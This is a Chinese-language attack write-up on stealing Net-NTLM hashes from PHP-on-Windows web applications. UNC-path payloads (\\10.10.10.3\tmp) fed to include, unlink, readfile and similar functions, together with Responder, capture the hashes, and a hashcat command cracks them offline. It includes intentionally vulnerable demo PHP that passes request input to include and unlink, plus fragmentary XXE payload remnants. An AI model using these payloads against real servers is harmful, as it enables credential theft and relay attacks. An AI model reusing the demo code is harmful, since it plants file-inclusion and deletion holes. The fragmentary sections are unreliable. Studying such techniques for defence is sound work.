Author: pen4uin
0x00 写在前面
0x01 获取Net-NTLM Hash
0x02 可利用的函数
01 include()
02 include_once()
03 require()
04 require_once()
05 file_get_contents()
06 file()
07 readfile()
08 file_exists()
09 filesize()
10 unlink()
11 fopen()
12 is_file()
13 file_put_contents()
∞ xxx()
0x03 可能出现的漏洞场景
SSRF
file://
XXE
php://filter
文件包含
文件删除
文件下载
文件读取
0x04 NTLM利用姿势
暴力破解
0x00 写在前面
       相信大家也都有看过一些关于获取Net-NTLM Hash文章，但是我感觉利用场景都更偏向于已突破网
络边界的情况(比如社工钓鱼/RCE等手段)，于是在这篇文章里我针对一些常见的Web场景
(PHP+Window)下对获取Net-NTLM Hash姿势的进行了测试，目前自己还未在实战场景测试，不知道效
果如何，师傅们就当作扩展思路吧！
0x01 获取Net-NTLM Hash
使用Responder获取Net-NTLM Hash
git clone https://github.com/lgandx/Responder.git
cd Responder/
./Responder.py -I eth0 -rv
0x02 可利用的函数
测试了大概20+的函数，这里仅以下面的demo演示效果
01 include()
?path=file://\\10.10.10.3\tmp
XXE
靶场
https://github.com/c0ny1/xxe-lab
php://filter
payload
文件包含
demo.php
payload
]>
&xxe;admin
<?php
$file = $_GET['file'];
include($file);
?file=\\10.10.10.3\tmp
文件删除
demo.php
<?php
$file = $_GET['file'];
unlink($file);
文件下载
如果存在一处文件下载的地方，一般会先判断所下载的文件是否存在
demo.php
<?php
$filename = $_GET['file']; 
if(file_exists($filename)){
    header('location:http://'.$filename); 
}else{
    header('HTTP/1.1 404 Not Found'); 
}
文件读取
demo.php
<?php
$filename = $_GET['file']; 
readfile($filename);
0x04 NTLM利用姿势
NTLM利用不是这篇文章的重点，这里分享一下常见的利用方式，感兴趣的师傅可自行研究测试。
利用思路
暴力破解
Relay 中继
SMB
EWS(Exchange)
LDAP
暴力破解
利用hashcat 基于字典进行离线爆破
参数说明
5600 Net-NTLM
如图
tip：
密码字典可以从每一次的项目中累积，毕竟这样更接近于实战场景的需求
hashcat -m 5600 
admin::.:88c06d46a5e743c5:FBD01056A7EBB9A06D69857C12D5F9DC:010100000000000000F4A
E876EB0D70195F68AC7D41F46370000000002000800320043004B004F0001001E00570049004E002
D0045003600380033003000590056004C0035005A00520004003400570049004E002D00450036003
80033003000590056004C0035005A0052002E00320043004B004F002E004C004F00430041004C000
3001400320043004B004F002E004C004F00430041004C0005001400320043004B004F002E004C004
F00430041004C000700080000F4AE876EB0D70106000400020000000800300030000000000000000
100000000200000AD34DB253663E6DF661C39C7D5712180BFA6346A77811E487B52B1C40C5853150
A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E003
10030002E00310030002E0033000000000000000000 /root/Desktop/Responder/password-
top1000.dict --force